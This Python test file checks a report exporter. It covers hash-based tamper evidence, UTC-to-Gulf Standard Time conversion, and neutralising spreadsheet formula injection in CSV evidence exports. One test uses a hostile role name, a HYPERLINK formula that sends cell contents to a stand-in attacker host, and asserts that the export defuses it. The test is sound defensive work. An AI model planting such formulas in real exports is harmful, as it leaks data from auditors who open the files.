"""Proves the report tamper-evidence and timezone requirements from spec
section 5: the stored hash must match the exported content's actual bytes,
and the export must be labeled/converted to Gulf Standard Time even though
everything is stored internally as UTC.

Also covers spreadsheet formula injection: these exports are opened in
Excel by auditors, and almost every column is populated from the monitored
database, where an attacker who can name a role can choose the string.
"""
import hashlib
from datetime import datetime, timedelta, timezone

from app.models.access_event import AccessEvent
from app.services.reports import generate_report_csv, verify_report_integrity


def _add_event(admin_db, ws, ds, actor="amina", occurred_at=None):
    occurred_at = occurred_at or datetime(2026, 9, 9, 6, 0, 0, tzinfo=timezone.utc)  # 10:00 GST
    admin_db.add(
        AccessEvent(
            workspace_id=ws.id,
            data_source_id=ds.id,
            source_log_id=f"f.csv:{actor}",
            actor_identifier=actor,
            actor_type="human",
            query_type="read",
            occurred_at=occurred_at,
        )
    )
    admin_db.commit()
    return occurred_at


def test_report_hash_matches_content(admin_db, make_workspace, make_data_source):
    ws = make_workspace()
    ds = make_data_source(ws)
    occurred_at = _add_event(admin_db, ws, ds)

    content, content_sha256 = generate_report_csv(
        admin_db, ws.id, occurred_at - timedelta(hours=1), occurred_at + timedelta(hours=1)
    )

    assert hashlib.sha256(content.encode("utf-8")).hexdigest() == content_sha256
    assert verify_report_integrity(content, content_sha256)
    assert "10:00:00 GST" in content  # 06:00 UTC -> 10:00 GST (UTC+4)


def test_tampered_report_fails_integrity_check(admin_db, make_workspace, make_data_source):
    ws = make_workspace()
    make_data_source(ws)
    admin_db.commit()

    now = datetime.now(timezone.utc)
    content, content_sha256 = generate_report_csv(admin_db, ws.id, now - timedelta(days=1), now)

    assert not verify_report_integrity(content + "extra,tampered,row\n", content_sha256)


def test_formula_injection_is_neutralised_in_export(admin_db, make_workspace, make_data_source):
    """A database role named like a formula must not execute when the
    auditor opens the evidence CSV."""
    ws = make_workspace()
    ds = make_data_source(ws)
    hostile_actor = '=HYPERLINK("http://attacker.example/"&A1,"click")'
    occurred_at = _add_event(admin_db, ws, ds, actor=hostile_actor)

    content, _ = generate_report_csv(
        admin_db, ws.id, occurred_at - timedelta(hours=1), occurred_at + timedelta(hours=1)
    )

    # The value is still present and readable, but can no longer be parsed
    # as a formula by a spreadsheet: it is prefixed and therefore literal.
    assert "HYPERLINK" in content
    assert '"\'=HYPERLINK' in content or "'=HYPERLINK" in content
    # No cell begins a formula directly after a delimiter or quote.
    for line in content.splitlines()[1:]:
        for cell in line.split(","):
            assert not cell.lstrip('"').startswith("=")
